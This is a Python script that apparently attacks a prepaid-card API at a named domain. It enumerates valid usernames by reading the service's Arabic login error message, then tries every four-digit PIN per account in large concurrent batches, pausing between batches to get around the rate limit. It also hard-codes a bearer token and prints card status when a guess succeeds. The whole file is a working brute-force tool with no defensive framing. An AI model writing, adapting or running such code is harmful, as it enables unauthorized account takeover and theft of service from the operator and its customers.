import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# === CONFIG ===
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
MAX_REQUESTS = 1000
STATE_FILE = "bruteforce_state.json"


# === STATE MANAGEMENT ===
def load_state():
  if os.path.exists(STATE_FILE):
    with open(STATE_FILE, 'r') as f:
      state = json.load(f)
      # Convert lists back to sets for tried_passwords
      state["tried_passwords"] = {
          k: set(v)
          for k, v in state["tried_passwords"].items()
      }
      return state
  return {"valid_usernames": [], "tried_passwords": {}}


def save_state(valid_usernames, tried_passwords):
  # Convert sets to lists for JSON serialization
  serializable_tried_passwords = {
      k: list(v)
      for k, v in tried_passwords.items()
  }
  state = {
      "valid_usernames": valid_usernames,
      "tried_passwords": serializable_tried_passwords
  }
  with open(STATE_FILE, 'w') as f:
    json.dump(state, f, indent=4)


# === API REQUEST ===
def send_request(payload):
  headers = {
      "Content-Type": "application/json",
      "Accept": "application/json",
      "Authorization": AUTH_HEADER,
      "Accept-Language": LANGUAGE
  }
  try:
    response = requests.post(API_URL, json=payload, headers=headers)
    return response.json(), payload
  except Exception as e:
    return {"error": str(e)}, payload


# === STEP 1: Generate and validate usernames ===
def generate_valid_usernames(prefix="20", count=1000, existing_usernames=None):
  print("🔍 Scanning usernames concurrently...")
  valid_usernames = existing_usernames or []
  usernames_to_test = count - len(valid_usernames)

  if usernames_to_test <= 0:
    print(f"✅ Already have {len(valid_usernames)} valid usernames.")
    return valid_usernames

  usernames = [
      f"{prefix}{random.randint(100000, 999999)}"
      for _ in range(usernames_to_test)
  ]
  payloads = [{"username": u} for u in usernames]

  with ThreadPoolExecutor(max_workers=1000) as executor:
    futures = [executor.submit(send_request, payload) for payload in payloads]
    for future in tqdm(as_completed(futures),
                       total=len(futures),
                       desc="Validating"):
      result, payload = future.result()
      if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
        valid_usernames.append(payload["username"])

  print(f"\n✅ Found {len(valid_usernames)} valid usernames in total.")
  save_state(valid_usernames, load_state().get("tried_passwords", {}))
  return valid_usernames


# === STEP 2: Brute-force passwords for each username ===
def try_passwords_for_users(valid_usernames):
  state = load_state()
  tried_passwords = state.get("tried_passwords", {})

  for username in valid_usernames:
    tried = tried_passwords.get(username, set())
    remaining_passwords = [
        str(i).zfill(4) for i in range(10000) if str(i).zfill(4) not in tried
    ]

    if not remaining_passwords:
      print(f"✅ All passwords tried for {username}.")
      continue

    print(
        f"\n🔐 Trying passwords for: {username} ({len(remaining_passwords)} remaining)"
    )

    while remaining_passwords:
      batch = remaining_passwords[:MAX_REQUESTS]
      payloads = [{"username": username, "password": p} for p in batch]

      success = None
      with ThreadPoolExecutor(max_workers=MAX_REQUESTS) as executor:
        futures = [
            executor.submit(send_request, payload) for payload in payloads
        ]
        for future in tqdm(as_completed(futures),
                           total=len(futures),
                           desc=f"Trying {username}"):
          result, payload = future.result()

          if result.get("status") is True and result.get("code") == 200:
            info = result.get("data", {})
            success = payload["password"]
            print(f"\n✅ SUCCESS for {username} → Password: {success}")
            print(f"➤ Status: {info.get('status')}")
            print(f"➤ Duration: {info.get('group_duration')}")
            print(f"➤ Remaining: {info.get('readable_remaining_time')}")
            tried_passwords[username] = tried_passwords.get(username,
                                                            set()) | set(batch)
            save_state(valid_usernames, tried_passwords)
            break

          tried_passwords[username] = tried_passwords.get(
              username, set()) | {payload["password"]}

      if success:
        break

      remaining_passwords = remaining_passwords[MAX_REQUESTS:]
      save_state(valid_usernames, tried_passwords)

      if remaining_passwords:
        print(f"🛌 Waiting 60s to send next batch for {username}...")
        time.sleep(60)

    if not success:
      print(f"❌ No password found for {username} after all attempts.")


# === RUN SCRIPT ===
if __name__ == "__main__":
  try:
    prefix = input("Enter username prefix (e.g. 20): ").strip()
    count = int(input("How many usernames to test? (max 1000): "))

    if count > MAX_REQUESTS:
      print(f"⚠️ Only {MAX_REQUESTS} usernames allowed per run due to limit.")
      count = MAX_REQUESTS

    state = load_state()
    valid_usernames = generate_valid_usernames(
        prefix, count, state.get("valid_usernames", []))

    if valid_usernames:
      print(f"📊 Testing {len(valid_usernames)} usernames.")
      try_passwords_for_users(valid_usernames)
    else:
      print("❗ No valid usernames found.")

  except KeyboardInterrupt:
    print("\n🛑 Stopped by user. Progress saved.")
    exit(0)
